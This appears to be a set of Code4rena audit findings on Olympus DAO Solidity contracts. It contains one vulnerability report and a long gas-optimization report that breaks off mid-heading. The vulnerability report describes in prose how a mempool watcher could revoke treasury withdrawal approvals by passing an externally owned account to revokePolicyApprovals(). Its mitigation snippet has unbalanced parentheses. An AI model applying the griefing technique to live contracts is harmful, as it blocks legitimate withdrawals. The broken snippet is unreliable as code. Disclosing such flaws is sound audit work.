https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/INSTR.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/VoterRegistration.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/interfaces/IBondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IHeart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L2 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67   # Vulnerability details  ## Impact Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.  ## Proof of Concept The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of "revoking a deactivated policy's approvals". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.   ## Tools Used  IDE (Remix, VSCode)  ## Recommended Mitigation Steps  A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:  As a public variable in Kernel.sol `mapping(address => bool) public isRegisteredPolicy;`  in Kernel.activatePolicy(): `isRegisteredPolicy[address(policy_)] ) = true;`  and finally in TreasuryCustodian.revokePolicyApprovals(): `if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`
[1] ``<ARRAY>.LENGTH`` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A`` FOR``-LOOP  The overheads outlined below are *PER LOOP*, excluding the first loop  -storage arrays incur a Gwarmaccess (100 gas) -memory arrays use MLOAD (3 gas) -calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset.   *There are 5 instances of this issue:*  ``` File : 2022-08-olympus/src/Kernel.sol  306: for (uint256 i; i < depLength; ) {  413: for (uint256 i; i < depcLength; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413)  ``` File :2022-08-olympus/src/policies/TreasuryCustodian.sol  59:   for (uint256 j; j < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59)  ``` File: 2022-08-olympus/src/policies/BondCallback.sol  156:   for (uint256 i; i < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156)  ```  File: 2022-08-olympus/src/policies/Governance.sol  278:  for (uint256 step; step < instructions.length; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  [2] USING  ``PRIVATE`` RATHER THAN ``PUBLIC`` FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  *There are 9 instances of this issue:*  ``` File: 2022-08-olympus/src/modules/RANGE.sol  65:  uint256 public constant FACTOR_SCALE = 1e4;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  ``` File: 2022-08-olympus/src/modules/PRICE.sol  59: uint8 public constant decimals = 18;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  ``` File:2022-08-olympus/src/policies/Operator.sol  89:  uint32 public constant FACTOR_SCALE = 1e4;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)  ``` File: 2022-08-olympus/src/policies/Governance.sol  121:  uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:   uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:   uint256 public constant GRACE_PERIOD = 1 weeks;  130:    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:   uint256 public constant EXECUTION_THRESHOLD = 33;  137:    uint256 public constant EXECUTION_TIMELOCK = 3 days;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)    [3]  ``PUBLIC`` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED ``EXTERNAL`` INSTEAD  Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents’ functions and change the visibility from ``external`` to ``public`` and can save gas by doing so.  *There are 5 instances of this issue:*  ``` File: 2022-08-olympus/src/Kernel.sol  439:  function grantRole(Role role_, address addr_) public onlyAdmin {  451:   function revokeRole(Role role_, address addr_) public onlyAdmin {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451)  ``` File: 2022-08-olympus/src/modules/TRSRY.sol  75:  function withdrawReserves( 76:        address to_, 77:        ERC20 token_, 78:        uint256 amount_ 79:    ) public {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  37:  function burnOhm(address from_, uint256 amount_) public permissioned {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37)  ``` File: 2022-08-olympus/src/modules/INSTR.sol  37: function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37)   [4] DON’T COMPARE BOOLEAN EXPRESSIONS TO BOOLEAN LITERALS   ``if (<x> == true)`` => ``if(<x>)`` , ``if (<x> == false)`` => ``if (!<x>)``  *There are 2 instances of this issue:*  ```  File: 2022-08-olympus/src/policies/Governance.sol  223:   if (proposalHasBeenActivated[proposalId_] == true) {  306:     if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   [5] USAGE OF ``UINTS/INTS`` SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size  [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed  *There are 92 instances of this issue*  ```  File: 2022-08-olympus/src/Kernel.sol  100:  function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}   #1  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  25: function VERSION() external pure override returns (uint8 major, uint8 minor) {      #2  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)   ```  File: 2022-08-olympus/src/modules/TRSRY.sol  51:  function VERSION() external pure override returns (uint8 major, uint8 minor) {     #3  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  ```  File: 2022-08-olympus/src/modules/RANGE.sol  45:  uint48 lastActive;           #4  85:  lastActive: uint48(block.timestamp),       #5  92:  lastActive: uint48(block.timestamp),       #6  136:  _range.high.lastActive = uint48(block.timestamp);        #7  148:  _range.low.lastActive = uint48(block.timestamp);        #8  191:  lastActive: uint48(block.timestamp),                    #9  200:   lastActive: uint48(block.timestamp),                   #10  115:  function VERSION() external pure override returns (uint8 major, uint8 minor) {      #11  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  ```  File: 2022-08-olympus/src/modules/PRICE.sol  44:   uint32 public nextObsIndex;              #12  47:   uint32 public numObservations;              #13  97:    numObservations = uint32(movingAverageDuration_ / observationFrequency_);        #14  127:   uint32 numObs = numObservations;                       #15  185:   uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;       #16  257:  numObservations = uint32(newObservations);                  #17  289:   numObservations = uint32(newObservations);                 #18  50:    uint48 public observationFrequency;                    #19  53:    uint48 public movingAverageDuration;                  #20  56:    uint48 public lastObservationTime;                    #21  75:     uint48 observationFrequency_,                         #22  76:      uint48 movingAverageDuration_                         #23  143:      lastObservationTime = uint48(block.timestamp);        #24  205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)      #25  215:       if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))     #26       240:      function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {     #27  266:      function changeObservationFrequency(uint48 observationFrequency_) external permissioned {       #28  59:        uint8 public constant decimals = 18;                     #29  84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();        #30  87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();         #31  113:       function VERSION() external pure override returns (uint8 major, uint8 minor) {        #32  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)   ```  File: 2022-08-olympus/src/modules/VOTES.sol  27: function VERSION() external pure override returns (uint8 major, uint8 minor) {       #33  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)    ```  File: 2022-08-olympus/src/modules/INSTR.sol  28:  function VERSION() public pure override returns (uint8 major, uint8 minor) {        #34  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)     ```  File: 2022-08-olympus/src/policies/Operator.sol   83:  uint8 public immutable ohmDecimals;                #35  86:  uint8 public immutable reserveDecimals;.             #36  375:  uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);           #37  377:   uint8(                                                                              #38 378:   36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals 379:   );  418:    uint8 oracleDecimals = PRICE.decimals();                     #39  430:     uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);          #40  432:      uint8(                                                                          #41 433:      36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals 434:      );  128:      lastRegen: uint48(block.timestamp),             #42  210:      uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&       #43           216:      uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&        #44  403:       vesting: uint48(0), // Instant swaps                            #45  404:        conclusion: uint48(block.timestamp + config_.cushionDuration),       #46  708:         _status.high.lastRegen = uint48(block.timestamp);                 #47  720:        _status.low.lastRegen = uint48(block.timestamp);                  #48  89:         uint32 public constant FACTOR_SCALE = 1e4;                           #49  97:          uint32[8] memory configParams                     #50  106:          if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          #51  108:           if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])     #52  116:             configParams[7] == uint32(0)                  #53  127:            count: uint32(0),                           #54  129:             nextObservation: uint32(0),                  #55  516:          function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {       #56  528:           uint32 duration_,                #57 529:        uint32 debtBuffer_,                   #58 530:        uint32 depositInterval_              #59  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();          #60 536:        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)       #61  548:       function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {       #62  560:        uint32 wait_,               #63 561:        uint32 threshold_,        #64 562:        uint32 observe_              #65  665:       uint32 observe = _config.regenObserve;          #66  705:        _status.high.count = uint32(0);                   #67  707:         _status.high.nextObservation = uint32(0);         #68  717:       _status.low.count = uint32(0);                    #69  719:       _status.low.nextObservation = uint32(0);              #70   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377-L379](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377-L379)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L430](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L430)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L432-L434](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L432-L434)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403-L404](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403-L404)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528-L530](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528-L530)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535-L536](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535-L536)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560-L562](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560-L562)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719)  ```  File: 2022-08-olympus/src/policies/PriceConfig.sol  45:  function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)               #71  58:   function changeMovingAverageDuration(uint48 movingAverageDuration_)                               #72  69:   function changeObservationFrequency(uint48 observationFrequency_)                                 #73  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69)   ```  File: 2022-08-olympus/src/policies/interfaces/IOperator.sol  13:  uint32 cushionFactor;       #74 14:  uint32 cushionDuration;      #75 15:  uint32 cushionDebtBuffer;    #76 16:  uint32 cushionDepositInterval;      #77 17:  uint32 reserveFactor;            #78 18:  uint32 regenWait;              #79 19:  uint32 regenThreshold;          #80 20:  uint32 regenObserve;            #81   31:  uint32 count;                    #82 32:  uint48 lastRegen;                 #83 33:  uint32 nextObservation;         #84    85:  function setCushionFactor(uint32 cushionFactor_) external;       #85   93:   uint32 duration_,                           #86 94:   uint32 debtBuffer_,                           #87 95:   uint32 depositInterval_                         #88  101:  function setReserveFactor(uint32 reserveFactor_) external;           #89  110:  uint32 wait_,                       #90 111:  uint32 threshold_,                  #91 112:  uint32 observe_                    #92  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13-L20](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13-L20)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31-L33](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31-L33)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93-L95](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93-L95)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110-L112](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110-L112)   [6]  USING ``STORAGE`` INSTEAD OF ``MEMORY`` FOR STRUCTS/ARRAYS SAVES GAS  When fetching data from a storage location, assigning the data to a ``memory`` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional ``MLOAD`` rather than a cheap stack read. Instead of declearing the variable with the ``memory`` keyword, declaring the variable with the ``storage`` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a ``memory`` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires ``memory``, or if the array/struct is being read from another ``memory`` array/struct  *There are 3 instances of this issue:*  ```  File: 2022-08-olympus/src/policies/Operator.sol  394: IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({  440:  Config memory config_ = _config;  446:   IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L394](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L394)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L446](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L446)  [7]  DIVISION BY TWO SHOULD USE BIT 